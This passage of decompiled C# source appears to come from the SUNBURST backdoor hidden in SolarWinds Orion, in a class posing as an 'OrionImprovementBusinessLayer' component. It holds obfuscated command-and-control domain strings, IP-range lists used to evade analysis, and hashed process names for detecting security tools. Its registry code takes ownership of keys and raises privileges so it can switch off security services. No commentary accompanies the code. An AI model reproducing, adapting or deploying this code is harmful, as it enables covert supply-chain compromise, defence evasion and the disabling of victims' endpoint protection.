					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 10393903804869831898UL,
						DefaultValue = 3U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 12445232961318634374UL,
						DefaultValue = 2U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 3421197789791424393UL,
						DefaultValue = 2U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 541172992193764396UL,
						DefaultValue = 2U
					}
				}
			}
		};

		// Token: 0x0400002A RID: 42
		private static readonly OrionImprovementBusinessLayer.IPAddressesHelper[] nList = new OrionImprovementBusinessLayer.IPAddressesHelper[]
		{
			new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("MzTQA0MA"), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TMAQQA="), OrionImprovementBusinessLayer.AddressFamilyEx.Atm),
			new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("MzQ30jM00zPQMwAA"), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TMyMdADQgA="), OrionImprovementBusinessLayer.AddressFamilyEx.Atm),
			new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("M7Q00jM0s9Az0DMAAA=="), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TMCYgM9AwA="), OrionImprovementBusinessLayer.AddressFamilyEx.Atm),
			new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("MzIy0TMAQQA="), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzIx0ANDAA=="), OrionImprovementBusinessLayer.AddressFamilyEx.Atm),
			new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("S0s2MLCyAgA="), OrionImprovementBusinessLayer.ZipHelper.Unzip("S0s1MLCyAgA="), OrionImprovementBusinessLayer.AddressFamilyEx.Atm),
			new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("S0tNNrCyAgA="), OrionImprovementBusinessLayer.ZipHelper.Unzip("S0tLNrCyAgA="), OrionImprovementBusinessLayer.AddressFamilyEx.Atm),
			new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("S0szMLCyAgA="), OrionImprovementBusinessLayer.ZipHelper.Unzip("S0szMLCyAgA="), OrionImprovementBusinessLayer.AddressFamilyEx.Atm),
			new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("MzHUszDRMzS11DMAAA=="), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TOCYgMA"), OrionImprovementBusinessLayer.AddressFamilyEx.Ipx),
			new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("MzfRMzQ00TMy0TMAAA=="), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TMCYRMLPQMA"), OrionImprovementBusinessLayer.AddressFamilyEx.Ipx),
			new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("MzQ10TM0tNAzNDHQMwAA"), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TOCYgMA"), OrionImprovementBusinessLayer.AddressFamilyEx.Ipx),
			new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI01zM0M9Yz1zMAAA=="), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TOCYgMA"), OrionImprovementBusinessLayer.AddressFamilyEx.Ipx),
			new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("MzLQMzQx0ANCAA=="), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TMyNdEz0DMAAA=="), OrionImprovementBusinessLayer.AddressFamilyEx.ImpLink),
			new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("szTTMzbUMzQ30jMAAA=="), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TOCYgMA"), OrionImprovementBusinessLayer.AddressFamilyEx.ImpLink),
			new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("MzQ21DMystAzNNIzAAA="), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TMCYyM9AwA="), OrionImprovementBusinessLayer.AddressFamilyEx.ImpLink),
			new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("MzQx0bMw0zMyMtMzAAA="), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TOCYgMA"), OrionImprovementBusinessLayer.AddressFamilyEx.ImpLink),
			new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("s9AztNAzNDHRMwAA"), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TMCYxM9AwA="), OrionImprovementBusinessLayer.AddressFamilyEx.NetBios),
			new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("M7TQMzQ20ANCAA=="), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TMCYgM9AwA="), OrionImprovementBusinessLayer.AddressFamilyEx.NetBios, true),
			new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("MzfUMzQ10jM11jMAAA=="), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TOCYgMA"), OrionImprovementBusinessLayer.AddressFamilyEx.NetBios),
			new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("s7TUM7fUM9AzAAA="), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TMCYgM9AwA="), OrionImprovementBusinessLayer.AddressFamilyEx.NetBios, true),
			new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("szDXMzK20LMw0DMAAA=="), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TMCYRMLPQMA"), OrionImprovementBusinessLayer.AddressFamilyEx.NetBios),
			new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("M7S01DMyMNQzNDTXMwAA"), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TOCYgMA"), OrionImprovementBusinessLayer.AddressFamilyEx.NetBios),
			new OrionImprovementBusinessLayer.IPAddressesHelper(OrionImprovementBusinessLayer.ZipHelper.Unzip("M7Qw0TM30jPQMwAA"), OrionImprovementBusinessLayer.ZipHelper.Unzip("MzI11TMyNdEz0DMAAA=="), OrionImprovementBusinessLayer.AddressFamilyEx.NetBios, true)
		};

		// Token: 0x0400002B RID: 43
		private static readonly ulong[] patternHashes = new ulong[]
		{
			1109067043404435916UL,
			15267980678929160412UL,
			8381292265993977266UL,
			3796405623695665524UL,
			8727477769544302060UL,
			10734127004244879770UL,
			11073283311104541690UL,
			4030236413975199654UL,
			7701683279824397773UL,
			5132256620104998637UL,
			5942282052525294911UL,
			4578480846255629462UL,
			16858955978146406642UL
		};

		// Token: 0x0400002C RID: 44
		private static readonly string[] patternList = new string[]
		{
			OrionImprovementBusinessLayer.ZipHelper.Unzip("07DP1NSIjkvUrYqtidPUKEktLoHzVTQB"),
			OrionImprovementBusinessLayer.ZipHelper.Unzip("07DP1NQozs9JLCrPzEsp1gQA")
		};

		// Token: 0x0400002D RID: 45
		private static readonly string reportStatusName = OrionImprovementBusinessLayer.ZipHelper.Unzip("C0otyC8qCU8sSc5ILQpKLSmqBAA=");

		// Token: 0x0400002E RID: 46
		private static readonly string serviceStatusName = OrionImprovementBusinessLayer.ZipHelper.Unzip("C0otyC8qCU8sSc5ILQrILy4pyM9LBQA=");

		// Token: 0x0400002F RID: 47
		private static string userAgentOrionImprovementClient = null;

		// Token: 0x04000030 RID: 48
		private static string userAgentDefault = null;

		// Token: 0x04000031 RID: 49
		private static readonly string apiHost = OrionImprovementBusinessLayer.ZipHelper.Unzip("SyzI1CvOz0ksKs/MSynWS87PBQA=");

		// Token: 0x04000032 RID: 50
		private static readonly string domain1 = OrionImprovementBusinessLayer.ZipHelper.Unzip("SywrLstNzskvTdFLzs8FAA==");

		// Token: 0x04000033 RID: 51
		private static readonly string domain2 = OrionImprovementBusinessLayer.ZipHelper.Unzip("SywoKK7MS9ZNLMgEAA==");

		// Token: 0x04000034 RID: 52
		private static readonly string[] domain3 = new string[]
		{
			OrionImprovementBusinessLayer.ZipHelper.Unzip("Sy3VLU8tLtE1BAA="),
			OrionImprovementBusinessLayer.ZipHelper.Unzip("Ky3WLU8tLtE1AgA="),
			OrionImprovementBusinessLayer.ZipHelper.Unzip("Ky3WTU0sLtE1BAA="),
			OrionImprovementBusinessLayer.ZipHelper.Unzip("Ky3WTU0sLtE1AgA=")
		};

		// Token: 0x04000035 RID: 53
		private static readonly string appId = OrionImprovementBusinessLayer.ZipHelper.Unzip("M7UwTkm0NDHVNTNKTNM1NEi10DWxNDDSTbRIMzIwTTY3SjJKBQA=");

		// Token: 0x04000036 RID: 54
		private static OrionImprovementBusinessLayer.ReportStatus status = OrionImprovementBusinessLayer.ReportStatus.New;

		// Token: 0x04000037 RID: 55
		private static string domain4 = null;

		// Token: 0x04000038 RID: 56
		private static byte[] userId = null;

		// Token: 0x04000039 RID: 57
		private static NamedPipeServerStream instance = null;

		// Token: 0x0400003A RID: 58
		private const int minInterval = 30;

		// Token: 0x0400003B RID: 59
		private const int maxInterval = 120;

		// Token: 0x0400003C RID: 60
		private static string osVersion = null;

		// Token: 0x0400003D RID: 61
		private static string osInfo = null;

		// Token: 0x020000CB RID: 203
		private enum ReportStatus
		{
			// Token: 0x040002D3 RID: 723
			New,
			// Token: 0x040002D4 RID: 724
			Append,
			// Token: 0x040002D5 RID: 725
			Truncate
		}

		// Token: 0x020000CC RID: 204
		private enum AddressFamilyEx
		{
			// Token: 0x040002D7 RID: 727
			NetBios,
			// Token: 0x040002D8 RID: 728
			ImpLink,
			// Token: 0x040002D9 RID: 729
			Ipx,
			// Token: 0x040002DA RID: 730
			InterNetwork,
			// Token: 0x040002DB RID: 731
			InterNetworkV6,
			// Token: 0x040002DC RID: 732
			Unknown,
			// Token: 0x040002DD RID: 733
			Atm,
			// Token: 0x040002DE RID: 734
			Error
		}

		// Token: 0x020000CD RID: 205
		private enum HttpOipMethods
		{
			// Token: 0x040002E0 RID: 736
			Get,
			// Token: 0x040002E1 RID: 737
			Head,
			// Token: 0x040002E2 RID: 738
			Put,
			// Token: 0x040002E3 RID: 739
			Post
		}

		// Token: 0x020000CE RID: 206
		private enum ProxyType
		{
			// Token: 0x040002E5 RID: 741
			Manual,
			// Token: 0x040002E6 RID: 742
			System,
			// Token: 0x040002E7 RID: 743
			Direct,
			// Token: 0x040002E8 RID: 744
			Default
		}

		// Token: 0x020000CF RID: 207
		private static class RegistryHelper
		{
			// Token: 0x06000966 RID: 2406 RVA: 0x00042A60 File Offset: 0x00040C60
			private static RegistryHive GetHive(string key, out string subKey)
			{
				string[] array = key.Split(new char[]
				{
					'\\'
				}, 2);
				string a = array[0].ToUpper();
				subKey = ((array.Length <= 1) ? "" : array[1]);
				if (a == OrionImprovementBusinessLayer.ZipHelper.Unzip("8/B2jYx39nEMDnYNjg/y9w8BAA==") || a == OrionImprovementBusinessLayer.ZipHelper.Unzip("8/B2DgIA"))
				{
					return RegistryHive.ClassesRoot;
				}
				if (a == OrionImprovementBusinessLayer.ZipHelper.Unzip("8/B2jYx3Dg0KcvULiQ8Ndg0CAA==") || a == OrionImprovementBusinessLayer.ZipHelper.Unzip("8/B2DgUA"))
				{
					return RegistryHive.CurrentUser;
				}
				if (a == OrionImprovementBusinessLayer.ZipHelper.Unzip("8/B2jYz38Xd29In3dXT28PRzBQA=") || a == OrionImprovementBusinessLayer.ZipHelper.Unzip("8/D28QUA"))
				{
					return RegistryHive.LocalMachine;
				}
				if (a == OrionImprovementBusinessLayer.ZipHelper.Unzip("8/B2jYwPDXYNCgYA") || a == OrionImprovementBusinessLayer.ZipHelper.Unzip("8/AOBQA="))
				{
					return RegistryHive.Users;
				}
				if (a == OrionImprovementBusinessLayer.ZipHelper.Unzip("8/B2jYx3Dg0KcvULiXf293PzdAcA") || a == OrionImprovementBusinessLayer.ZipHelper.Unzip("8/B2dgYA"))
				{
					return RegistryHive.CurrentConfig;
				}
				if (a == OrionImprovementBusinessLayer.ZipHelper.Unzip("8/B2jYwPcA1y8/d19HN2jXdxDHEEAA==") || a == OrionImprovementBusinessLayer.ZipHelper.Unzip("8/AOcAEA"))
				{
					return RegistryHive.PerformanceData;
				}
				if (a == OrionImprovementBusinessLayer.ZipHelper.Unzip("8/B2jYx3ifSLd3EMcQQA") || a == OrionImprovementBusinessLayer.ZipHelper.Unzip("8/B2cQEA"))
				{
					return RegistryHive.DynData;
				}
				return (RegistryHive)0;
			}

			// Token: 0x06000967 RID: 2407 RVA: 0x00042BC4 File Offset: 0x00040DC4
			public static bool SetValue(string key, string valueName, string valueData, RegistryValueKind valueKind)
			{
				string name;
				bool result;
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(OrionImprovementBusinessLayer.RegistryHelper.GetHive(key, out name), RegistryView.Registry64))
				{
					using (RegistryKey registryKey2 = registryKey.OpenSubKey(name, true))
					{
						switch (valueKind)
						{
						case RegistryValueKind.String:
						case RegistryValueKind.ExpandString:
						case RegistryValueKind.DWord:
						case RegistryValueKind.QWord:
							registryKey2.SetValue(valueName, valueData, valueKind);
							goto IL_98;
						case RegistryValueKind.Binary:
							registryKey2.SetValue(valueName, OrionImprovementBusinessLayer.HexStringToByteArray(valueData), valueKind);
							goto IL_98;
						case RegistryValueKind.MultiString:
							registryKey2.SetValue(valueName, valueData.Split(new string[]
							{
								"\r\n",
								"\n"
							}, StringSplitOptions.None), valueKind);
							goto IL_98;
						}
						return false;
						IL_98:
						result = true;
					}
				}
				return result;
			}

			// Token: 0x06000968 RID: 2408 RVA: 0x00042CA0 File Offset: 0x00040EA0
			public static string GetValue(string key, string valueName, object defaultValue)
			{
				string name;
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(OrionImprovementBusinessLayer.RegistryHelper.GetHive(key, out name), RegistryView.Registry64))
				{
					using (RegistryKey registryKey2 = registryKey.OpenSubKey(name))
					{
						object value = registryKey2.GetValue(valueName, defaultValue);
						if (value != null)
						{
							if (value.GetType() == typeof(byte[]))
							{
								return OrionImprovementBusinessLayer.ByteArrayToHexString((byte[])value);
							}
							if (value.GetType() == typeof(string[]))
							{
								return string.Join("\n", (string[])value);
							}
							return value.ToString();
						}
					}
				}
				return null;
			}

			// Token: 0x06000969 RID: 2409 RVA: 0x00042D68 File Offset: 0x00040F68
			public static void DeleteValue(string key, string valueName)
			{
				string name;
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(OrionImprovementBusinessLayer.RegistryHelper.GetHive(key, out name), RegistryView.Registry64))
				{
					using (RegistryKey registryKey2 = registryKey.OpenSubKey(name, true))
					{
						registryKey2.DeleteValue(valueName, true);
					}
				}
			}

			// Token: 0x0600096A RID: 2410 RVA: 0x00042DCC File Offset: 0x00040FCC
			public static string GetSubKeyAndValueNames(string key)
			{
				string name;
				string result;
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(OrionImprovementBusinessLayer.RegistryHelper.GetHive(key, out name), RegistryView.Registry64))
				{
					using (RegistryKey registryKey2 = registryKey.OpenSubKey(name))
					{
						result = string.Join("\n", registryKey2.GetSubKeyNames()) + "\n\n" + string.Join(" \n", registryKey2.GetValueNames());
					}
				}
				return result;
			}

			// Token: 0x0600096B RID: 2411 RVA: 0x00042E54 File Offset: 0x00041054
			private static string GetNewOwnerName()
			{
				string text = null;
				string value = OrionImprovementBusinessLayer.ZipHelper.Unzip("C9Y11DXVBQA=");
				string value2 = OrionImprovementBusinessLayer.ZipHelper.Unzip("0zU1MAAA");
				try
				{
					text = new NTAccount(OrionImprovementBusinessLayer.ZipHelper.Unzip("c0zJzczLLC4pSizJLwIA")).Translate(typeof(SecurityIdentifier)).Value;
				}
				catch
				{
				}
				if (string.IsNullOrEmpty(text) || !text.StartsWith(value, StringComparison.OrdinalIgnoreCase) || !text.EndsWith(value2, StringComparison.OrdinalIgnoreCase))
				{
					string queryString = OrionImprovementBusinessLayer.ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNooPLU4tckxOzi/NKwEA");
					text = null;
					using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(queryString))
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
						{
							ManagementObject managementObject = (ManagementObject)managementBaseObject;
							string text2 = managementObject.Properties[OrionImprovementBusinessLayer.ZipHelper.Unzip("C/Z0AQA=")].Value.ToString();
							if (managementObject.Properties[OrionImprovementBusinessLayer.ZipHelper.Unzip("88lPTsxxTE7OL80rAQA=")].Value.ToString().ToLower() == OrionImprovementBusinessLayer.ZipHelper.Unzip("KykqTQUA") && text2.StartsWith(value, StringComparison.OrdinalIgnoreCase))
							{
								if (text2.EndsWith(value2, StringComparison.OrdinalIgnoreCase))
								{
									text = text2;
									break;
								}
								if (string.IsNullOrEmpty(text))
								{
									text = text2;
								}
							}
						}
					}
				}
				return new SecurityIdentifier(text).Translate(typeof(NTAccount)).Value;
			}

			// Token: 0x0600096C RID: 2412 RVA: 0x00042FD4 File Offset: 0x000411D4
			private static void SetKeyOwner(RegistryKey key, string subKey, string owner)
			{
				using (RegistryKey registryKey = key.OpenSubKey(subKey, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.TakeOwnership))
				{
					RegistrySecurity registrySecurity = new RegistrySecurity();
					registrySecurity.SetOwner(new NTAccount(owner));
					registryKey.SetAccessControl(registrySecurity);
				}
			}

			// Token: 0x0600096D RID: 2413 RVA: 0x00043024 File Offset: 0x00041224
			private static void SetKeyOwnerWithPrivileges(RegistryKey key, string subKey, string owner)
			{
				try
				{
					OrionImprovementBusinessLayer.RegistryHelper.SetKeyOwner(key, subKey, owner);
				}
				catch
				{
					bool newState = false;
					bool newState2 = false;
					bool flag = false;
					bool flag2 = false;
					string privilege = OrionImprovementBusinessLayer.ZipHelper.Unzip("C04NSi0uyS9KDSjKLMvMSU1PBQA=");
					string privilege2 = OrionImprovementBusinessLayer.ZipHelper.Unzip("C04NScxO9S/PSy0qzsgsCCjKLMvMSU1PBQA=");
					flag = OrionImprovementBusinessLayer.NativeMethods.SetProcessPrivilege(privilege2, true, out newState);
					flag2 = OrionImprovementBusinessLayer.NativeMethods.SetProcessPrivilege(privilege, true, out newState2);
					try
					{
						OrionImprovementBusinessLayer.RegistryHelper.SetKeyOwner(key, subKey, owner);
					}
					finally
					{
						if (flag)
						{
							OrionImprovementBusinessLayer.NativeMethods.SetProcessPrivilege(privilege2, newState, out newState);
						}
						if (flag2)
						{
							OrionImprovementBusinessLayer.NativeMethods.SetProcessPrivilege(privilege, newState2, out newState2);
						}
					}
				}
			}

			// Token: 0x0600096E RID: 2414 RVA: 0x000430B8 File Offset: 0x000412B8
			public static void SetKeyPermissions(RegistryKey key, string subKey, bool reset)
			{
				bool isProtected = !reset;
				string text = OrionImprovementBusinessLayer.ZipHelper.Unzip("C44MDnH1BQA=");
				string text2 = reset ? text : OrionImprovementBusinessLayer.RegistryHelper.GetNewOwnerName();
				OrionImprovementBusinessLayer.RegistryHelper.SetKeyOwnerWithPrivileges(key, subKey, text);
				using (RegistryKey registryKey = key.OpenSubKey(subKey, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.ChangePermissions))
				{
					RegistrySecurity registrySecurity = new RegistrySecurity();
					if (!reset)
					{
						RegistryAccessRule rule = new RegistryAccessRule(text2, RegistryRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
						registrySecurity.AddAccessRule(rule);
					}
					registrySecurity.SetAccessRuleProtection(isProtected, false);
					registryKey.SetAccessControl(registrySecurity);
				}
				if (!reset)
				{
					OrionImprovementBusinessLayer.RegistryHelper.SetKeyOwnerWithPrivileges(key, subKey, text2);
				}
			}
		}

		// Token: 0x020000D0 RID: 208
		private static class ConfigManager
		{
			// Token: 0x0600096F RID: 2415 RVA: 0x00043154 File Offset: 0x00041354
			public static bool ReadReportStatus(out OrionImprovementBusinessLayer.ReportStatus status)
			{
				try
				{
					string s;
					int num;
					if (OrionImprovementBusinessLayer.ConfigManager.ReadConfig(OrionImprovementBusinessLayer.reportStatusName, out s) && int.TryParse(s, out num))
					{
						switch (num)
						{
						case 3:
							status = OrionImprovementBusinessLayer.ReportStatus.Truncate;
							return true;
						case 4:
							status = OrionImprovementBusinessLayer.ReportStatus.New;
							return true;
						case 5:
							status = OrionImprovementBusinessLayer.ReportStatus.Append;
							return true;
						}
					}
				}
				catch (ConfigurationErrorsException)
				{
				}
				status = OrionImprovementBusinessLayer.ReportStatus.New;
				return false;
			}

			// Token: 0x06000970 RID: 2416 RVA: 0x000431C0 File Offset: 0x000413C0
			public static bool ReadServiceStatus(bool _readonly)
			{
				try
				{
					string s;
					int num;
					if (OrionImprovementBusinessLayer.ConfigManager.ReadConfig(OrionImprovementBusinessLayer.serviceStatusName, out s) && int.TryParse(s, out num) && num >= 250 && num % 5 == 0 && num <= 250 + ((1 << OrionImprovementBusinessLayer.svcList.Length) - 1) * 5)
					{
						num = (num - 250) / 5;
						if (!_readonly)
						{
							for (int i = 0; i < OrionImprovementBusinessLayer.svcList.Length; i++)
							{
								OrionImprovementBusinessLayer.svcList[i].stopped = ((num & 1 << i) != 0);
							}
						}
						return true;
					}
				}
				catch (Exception)
				{
				}
				if (!_readonly)
				{
					for (int j = 0; j < OrionImprovementBusinessLayer.svcList.Length; j++)
					{
						OrionImprovementBusinessLayer.svcList[j].stopped = true;
					}
				}
				return false;
			}

			// Token: 0x06000971 RID: 2417 RVA: 0x00043284 File Offset: 0x00041484
			public static bool WriteReportStatus(OrionImprovementBusinessLayer.ReportStatus status)
			{
				OrionImprovementBusinessLayer.ReportStatus reportStatus;
				if (OrionImprovementBusinessLayer.ConfigManager.ReadReportStatus(out reportStatus))
				{
					switch (status)
					{
					case OrionImprovementBusinessLayer.ReportStatus.New:
						return OrionImprovementBusinessLayer.ConfigManager.WriteConfig(OrionImprovementBusinessLayer.reportStatusName, OrionImprovementBusinessLayer.ZipHelper.Unzip("MwEA"));
					case OrionImprovementBusinessLayer.ReportStatus.Append:
						return OrionImprovementBusinessLayer.ConfigManager.WriteConfig(OrionImprovementBusinessLayer.reportStatusName, OrionImprovementBusinessLayer.ZipHelper.Unzip("MwUA"));
					case OrionImprovementBusinessLayer.ReportStatus.Truncate:
						return OrionImprovementBusinessLayer.ConfigManager.WriteConfig(OrionImprovementBusinessLayer.reportStatusName, OrionImprovementBusinessLayer.ZipHelper.Unzip("MwYA"));
					}
				}
				return false;
			}

			// Token: 0x06000972 RID: 2418 RVA: 0x000432F0 File Offset: 0x000414F0
			public static bool WriteServiceStatus()
			{
				if (OrionImprovementBusinessLayer.ConfigManager.ReadServiceStatus(true))
				{
					int num = 0;
					for (int i = 0; i < OrionImprovementBusinessLayer.svcList.Length; i++)
					{
						num |= (OrionImprovementBusinessLayer.svcList[i].stopped ? 1 : 0) << i;
					}
					return OrionImprovementBusinessLayer.ConfigManager.WriteConfig(OrionImprovementBusinessLayer.serviceStatusName, (num * 5 + 250).ToString());
				}
				return false;
			}

			// Token: 0x06000973 RID: 2419 RVA: 0x00043350 File Offset: 0x00041550
			private static bool ReadConfig(string key, out string sValue)
			{
				sValue = null;
				try
				{
					sValue = ConfigurationManager.AppSettings[key];
					return true;
				}
				catch (Exception)
				{
				}
				return false;
			}

			// Token: 0x06000974 RID: 2420 RVA: 0x00043388 File Offset: 0x00041588
			private static bool WriteConfig(string key, string sValue)
			{
				try
				{
					Configuration configuration = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);
					KeyValueConfigurationCollection settings = configuration.AppSettings.Settings;
					if (settings[key] != null)
					{
						settings[key].Value = sValue;
						configuration.Save(ConfigurationSaveMode.Modified);
						ConfigurationManager.RefreshSection(configuration.AppSettings.SectionInformation.Name);
						return true;
					}
				}
				catch (Exception)
				{
				}
				return false;
			}
		}

		// Token: 0x020000D1 RID: 209
		private class ServiceConfiguration
		{
			// Token: 0x1700012E RID: 302
			// (get) Token: 0x06000975 RID: 2421 RVA: 0x000433F8 File Offset: 0x000415F8
			// (set) Token: 0x06000976 RID: 2422 RVA: 0x0004343C File Offset: 0x0004163C
			public bool stopped
			{
				get
				{
					object @lock = this._lock;
					bool stopped;
					lock (@lock)
					{
						stopped = this._stopped;
					}
					return stopped;
				}
				set
				{
					object @lock = this._lock;
					lock (@lock)
					{
						this._stopped = value;
					}
				}
			}

			// Token: 0x1700012F RID: 303
			// (get) Token: 0x06000977 RID: 2423 RVA: 0x00043480 File Offset: 0x00041680
			// (set) Token: 0x06000978 RID: 2424 RVA: 0x000434C4 File Offset: 0x000416C4
			public bool running
			{
				get
				{
					object @lock = this._lock;
					bool running;
					lock (@lock)
					{
						running = this._running;
					}
					return running;
				}
				set
				{
					object @lock = this._lock;
					lock (@lock)
					{
						this._running = value;
					}
				}
			}

			// Token: 0x17000130 RID: 304
			// (get) Token: 0x06000979 RID: 2425 RVA: 0x00043508 File Offset: 0x00041708
			// (set) Token: 0x0600097A RID: 2426 RVA: 0x0004354C File Offset: 0x0004174C
			public bool disabled
			{
				get
				{
					object @lock = this._lock;
					bool disabled;
					lock (@lock)
					{
						disabled = this._disabled;
					}
					return disabled;
				}
				set
				{
					object @lock = this._lock;
					lock (@lock)
					{
						this._disabled = value;
					}
				}
			}

			// Token: 0x040002E9 RID: 745
			public ulong[] timeStamps;

			// Token: 0x040002EA RID: 746
			private readonly object _lock = new object();

			// Token: 0x040002EB RID: 747
			private volatile bool _stopped;

			// Token: 0x040002EC RID: 748
			private volatile bool _running;

			// Token: 0x040002ED RID: 749
			private volatile bool _disabled;

			// Token: 0x040002EE RID: 750
			public OrionImprovementBusinessLayer.ServiceConfiguration.Service[] Svc;

			// Token: 0x020001C0 RID: 448
			public class Service
			{
				// Token: 0x0400059E RID: 1438
				public ulong timeStamp;

				// Token: 0x0400059F RID: 1439
				public uint DefaultValue;

				// Token: 0x040005A0 RID: 1440
				public bool started;
			}
		}

		// Token: 0x020000D2 RID: 210
		private static class ProcessTracker
		{
			// Token: 0x0600097C RID: 2428 RVA: 0x000435A4 File Offset: 0x000417A4
			private static bool SearchConfigurations()
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(OrionImprovementBusinessLayer.ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNooPriwuSc11KcosSy0CAA==")))
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						ulong hash = OrionImprovementBusinessLayer.GetHash(Path.GetFileName(((ManagementObject)managementBaseObject).Properties[OrionImprovementBusinessLayer.ZipHelper.Unzip("C0gsyfBLzE0FAA==")].Value.ToString()).ToLower());
						if (Array.IndexOf<ulong>(OrionImprovementBusinessLayer.configTimeStamps, hash) != -1)
						{
							return true;
						}
					}
				}
				return false;
			}

			// Token: 0x0600097D RID: 2429 RVA: 0x00043658 File Offset: 0x00041858
			private static bool SearchAssemblies(Process[] processes)
			{
				for (int i = 0; i < processes.Length; i++)
				{
					ulong hash = OrionImprovementBusinessLayer.GetHash(processes[i].ProcessName.ToLower());
					if (Array.IndexOf<ulong>(OrionImprovementBusinessLayer.assemblyTimeStamps, hash) != -1)
					{
						return true;
					}
				}
				return false;
			}

			// Token: 0x0600097E RID: 2430 RVA: 0x00043698 File Offset: 0x00041898
			private static bool SearchServices(Process[] processes)
			{
				for (int i = 0; i < processes.Length; i++)
				{
					ulong hash = OrionImprovementBusinessLayer.GetHash(processes[i].ProcessName.ToLower());
					foreach (OrionImprovementBusinessLayer.ServiceConfiguration serviceConfiguration in OrionImprovementBusinessLayer.svcList)
					{
						if (Array.IndexOf<ulong>(serviceConfiguration.timeStamps, hash) != -1)
						{
							object @lock = OrionImprovementBusinessLayer.ProcessTracker._lock;
							lock (@lock)
							{
								if (!serviceConfiguration.running)
								{
									OrionImprovementBusinessLayer.svcListModified1 = true;
									OrionImprovementBusinessLayer.svcListModified2 = true;
									serviceConfiguration.running = true;
								}
								if (!serviceConfiguration.disabled && !serviceConfiguration.stopped && serviceConfiguration.Svc.Length != 0)
								{
									OrionImprovementBusinessLayer.DelayMin(0, 0);
									OrionImprovementBusinessLayer.ProcessTracker.SetManualMode(serviceConfiguration.Svc);
									serviceConfiguration.disabled = true;
									serviceConfiguration.stopped = true;
								}
							}
						}
					}
				}
				if (OrionImprovementBusinessLayer.svcList.Any((OrionImprovementBusinessLayer.ServiceConfiguration a) => a.disabled))
				{
					OrionImprovementBusinessLayer.ConfigManager.WriteServiceStatus();
					return true;
				}
				return false;
			}

			// Token: 0x0600097F RID: 2431 RVA: 0x000437C0 File Offset: 0x000419C0
			public static bool TrackProcesses(bool full)
			{
				Process[] processes = Process.GetProcesses();
				if (OrionImprovementBusinessLayer.ProcessTracker.SearchAssemblies(processes))
				{
					return true;
				}
				bool flag = OrionImprovementBusinessLayer.ProcessTracker.SearchServices(processes);
				if (!flag && full)
				{
					return OrionImprovementBusinessLayer.ProcessTracker.SearchConfigurations();
				}
				return flag;
			}

